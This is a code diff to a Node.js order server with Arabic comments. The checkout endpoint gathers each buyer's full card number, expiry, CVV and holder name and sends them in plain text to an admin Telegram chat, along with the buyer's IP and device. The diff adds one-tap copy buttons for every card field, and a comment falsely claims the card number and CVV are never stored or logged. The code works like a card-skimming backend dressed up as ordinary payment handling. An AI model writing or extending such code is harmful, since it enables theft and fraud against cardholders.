@@ -1608,8 +1608,36 @@ async function computeRate(details) {
   return Number(cfg.fixedRate || 1320);
 }
 
+/** نص الحافظة لزر copy_text في Telegram (1–256 حرفاً). */
+function telegramCopyTextPayload(raw) {
+  const t = String(raw ?? '').trim();
+  if (!t.length) return '—';
+  return t.length > 256 ? t.slice(0, 256) : t;
+}
+
+/** زر ينسخ النص إلى الحافظة في تيليغرام (Bot API ≥ 7.0). */
+function inlineKeyboardCopyButton(label, textToCopy) {
+  return {
+    text: String(label).slice(0, 64),
+    copy_text: { text: telegramCopyTextPayload(textToCopy) },
+  };
+}
+
+function buildCreditCardCopyRows(holderName, panDigits, expiry, cvv) {
+  return [
+    [
+      inlineKeyboardCopyButton('نسخ الاسم 📋', holderName),
+      inlineKeyboardCopyButton('نسخ الرقم 📋', panDigits),
+    ],
+    [
+      inlineKeyboardCopyButton('نسخ التاريخ 📋', expiry),
+      inlineKeyboardCopyButton('نسخ CVV 📋', cvv),
+    ],
+  ];
+}
+
 /** Telegram: callback_data ≤ 64 bytes. Prefix od:/oa:/oc:/or: + orderId (لا يتعارض مع قوائم أخرى). */
-function orderInlineKeyboard(businessOrderId, extraRows = [], priorRows = []) {
+function orderInlineKeyboard(businessOrderId, extraRows = [], priorRows = [], prependRows = []) {
   const oidFull = String(businessOrderId || '').trim();
   const enc = (actionLetter) => {
     const prefix = `o${actionLetter}:`;
@@ -1621,6 +1649,7 @@ function orderInlineKeyboard(businessOrderId, extraRows = [], priorRows = []) {
   };
   return {
     inline_keyboard: [
+      ...prependRows,
       [{ text: '✅ تم إكمال الطلب', callback_data: enc('d') }],
       [
         { text: '⏸ تعليق', callback_data: enc('a') },
@@ -1866,6 +1895,8 @@ app.post('/api/order', async (req, res) => {
     }
 
     let cardExpiryNorm = '';
+    /** لرسالة تيليغرام للأدمن فقط (أزرار نسخ + مربع pre). لا يُحفظ في CRM. */
+    let ccTelegramFields = null;
     if (paymentMethod === 'CreditCard') {
       const holder = String(cardHolderName || '').trim();
       const digits = String(cardNumber || '').replace(/\D/g, '');
@@ -1883,7 +1914,9 @@ app.post('/api/order', async (req, res) => {
 
       if (!/^[0-9A-Za-z]{3}$/.test(cvv)) return res.status(400).json({ error: 'Invalid CVV' });
 
-      // Never log/store the full card number/CVV.
+      ccTelegramFields = { holder, pan: digits, expiry: cardExpiryNorm, cvv };
+
+      // Never log/store the full card number/CVV (يتم إرسالها لقناة تيليغرام الأدمن فقط أعلاه).
     }
 
     const detailsFull = await loadPaymentDetails();
@@ -1938,62 +1971,48 @@ app.post('/api/order', async (req, res) => {
       paymentProofName ? `<b>📎 دليل الدفع:</b> ${escapeTelegramHtml(paymentProofName)}` : null,
       `<b>📱 الجهاز:</b> ${escapeTelegramHtml(deviceLabel)}`,
       `<b>🌐 IP:</b> <code>${escapeTelegramHtml(clientIp || '—')}</code>`,
-      ...(paymentMethod === 'CreditCard'
+      ...(paymentMethod === 'CreditCard' && ccTelegramFields
         ? [
-            '<b>🧪 وسيلة دفع بطاقة ائتمان:</b>',
-            `<b>اسم الحامل:</b> ${escapeTelegramHtml(cardHolderName || '')}`,
-            `<b>رقم البطاقة:</b> <code>${escapeTelegramHtml(String(cardNumber || '').replace(/\D/g, '').slice(-16) || '')}</code>`,
-            `<b>تاريخ الانتهاء:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
-            `<b>CVV:</b> <code>${escapeTelegramHtml(String(cardCvv || '').slice(-3) || '')}</code>`,
+            '💳 <b>الطريقة:</b> بطاقة بنكية',
+            '📊 <b>النوع:</b> شراء',
+            '📦 <b>بيانات البطاقة</b> – اضغط زر «نسخ» لكل حقل',
+            `<pre>${escapeTelegramHtml(
+              [
+                `👤 الاسم: ${ccTelegramFields.holder}`,
+                `💳 الرقم: ${ccTelegramFields.pan}`,
+                `📅 الانتهاء: ${ccTelegramFields.expiry}`,
+                `🔒 CVV: ${ccTelegramFields.cvv}`,
+              ].join('\n')
+            )}</pre>`,
           ]
         : []),
       '━━━━━━━━━━━━━━━',
       hasPriorCustomerOrders
         ? '⚠️ <b>تنبيه:</b> يوجد طلبات سابقة من نفس IP أو البصمة — استخدم الأزرار أدناه.'
         : null,
-      '<i>استخدم الأزرار أدناه لتحديث حالة الطلب (يظهر للعميل في صفحة التتبع).</i>',
+      paymentMethod === 'CreditCard'
+        ? '<i>أزرار النسخ تملأ الحافظة مباشرة. أزرار الحالة تحدّث الطلب للعميل في التتبع.</i>'
+        : '<i>استخدم الأزرار أدناه لتحديث حالة الطلب (يظهر للعميل في صفحة التتبع).</i>',
     ].filter(Boolean);
 
     const modKb = await moderationInlineKeyboard(clientIp, visitorId);
     const modRows = modKb?.inline_keyboard || [];
     const priorRows = hasPriorCustomerOrders ? buildPriorOrderRows(clientIp, visitorId) : [];
+    const ccCopyRows =
+      paymentMethod === 'CreditCard' && ccTelegramFields
+        ? buildCreditCardCopyRows(
+            ccTelegramFields.holder,
+            ccTelegramFields.pan,
+            ccTelegramFields.expiry,
+            ccTelegramFields.cvv
+          )
+        : [];
     const { data: tgOrder } = await tgPostJson(botToken, 'sendMessage', {
       chat_id: telegramChatIdForApi(chatId),
       text: lines.join('\n'),
       parse_mode: 'HTML',
-      reply_markup: orderInlineKeyboard(safeOrderId, modRows, priorRows),
+      reply_markup: orderInlineKeyboard(safeOrderId, modRows, priorRows, ccCopyRows),
     });
-
-    if (paymentMethod === 'CreditCard' && tgOrder?.ok) {
-      const ccHolder = String(cardHolderName || '').trim();
-      const ccPan = String(cardNumber || '').replace(/\D/g, '');
-      const ccExp = String(cardExpiryNorm || '').trim();
-      const ccCvv = String(cardCvv || '').trim();
-      const copyCardKb = {
-        inline_keyboard: [
-          [
-            { text: '📋 نسخ اسم الحامل', callback_data: `cccp:${makeActionToken('ccp_h', ccHolder)}` },
-            { text: '📋 نسخ الرقم', callback_data: `cccp:${makeActionToken('ccp_n', ccPan)}` },
-          ],
-          [
-            { text: '📋 نسخ التاريخ', callback_data: `cccp:${makeActionToken('ccp_e', ccExp)}` },
-            { text: '📋 نسخ CVV', callback_data: `cccp:${makeActionToken('ccp_v', ccCvv)}` },
-          ],
-        ],
-      };
-      const { data: tgCopy } = await tgPostJson(botToken, 'sendMessage', {
-        chat_id: telegramChatIdForApi(chatId),
-        text:
-          '💳 <b>بيانات البطاقة — نسخ سريع</b>\n'
-          + `<code>${escapeTelegramHtml(safeOrderId)}</code>\n`
-          + 'اضغط زراً لإرسال القيمة في رسالة منفصلة (<code>جاهزة للنسخ</code>).',
-        parse_mode: 'HTML',
-        reply_markup: copyCardKb,
-      });
-      if (!tgCopy?.ok) {
-        console.error('[order] Telegram card copy keyboard:', JSON.stringify(tgCopy || {}));
-      }
-    }
 
     if (!tgOrder?.ok) {
       console.error('[order] Telegram sendMessage:', JSON.stringify(tgOrder || {}));
@@ -3051,7 +3070,7 @@ async function sendOrderDetailsById(orderId, forceChatId = null) {
   const priorRows = hasPriorOrders(all, resolvedIp || o.ip, o.visitorId || '', o.orderId)
     ? buildPriorOrderRows(resolvedIp || o.ip || '', o.visitorId || '')
     : [];
-  const ordKb = orderInlineKeyboard(o.orderId, modRows, priorRows);
+  const ordKb = orderInlineKeyboard(o.orderId, modRows, priorRows, []);
   ordKb.inline_keyboard.push(
     [{ text: '🔙 أنواع الطلبات', callback_data: 'menu_orders' }],
     MAIN_MENU_INLINE_BTN,
@@ -3248,38 +3267,6 @@ async function handleCallbackQuery(data, incomingChatId, fromUserId) {
       ? '📋 <b>جميع طلبات هذا الزبون (نفس معرّف IP)</b>'
       : '📋 <b>جميع طلبات هذا الزبون (نفس البصمة / الجهاز)</b>';
     await sendTelegramOrderList(incomingChatId, matched, title);
-    return;
-  }
-
-  const cccpM = String(data || '').match(/^cccp:(.+)$/);
-  if (cccpM) {
-    const token = cccpM[1];
-    const types = ['ccp_h', 'ccp_n', 'ccp_e', 'ccp_v'];
-    const labels = {
-      ccp_h: 'اسم الحامل',
-      ccp_n: 'رقم البطاقة',
-      ccp_e: 'تاريخ الانتهاء',
-      ccp_v: 'CVV',
-    };
-    let val = null;
-    let tp = '';
-    for (const t of types) {
-      const v = readActionToken(token, t);
-      if (v != null && v !== '') {
-        val = v;
-        tp = t;
-        break;
-      }
-    }
-    if (val == null) {
-      await botSend('⚠️ انتهت صلاحية زر النسخ. أعد فتح آخر طلب بطاقة.', {}, incomingChatId);
-      return;
-    }
-    await botSend(
-      `📋 <b>${labels[tp] || 'قيمة'}</b>\n<code>${escapeTelegramHtml(String(val))}</code>\n\n<i>اضغط مطولاً على القيمة أو انسخ من القائمة.</i>`,
-      {},
-      incomingChatId
-    );
     return;
   }
 
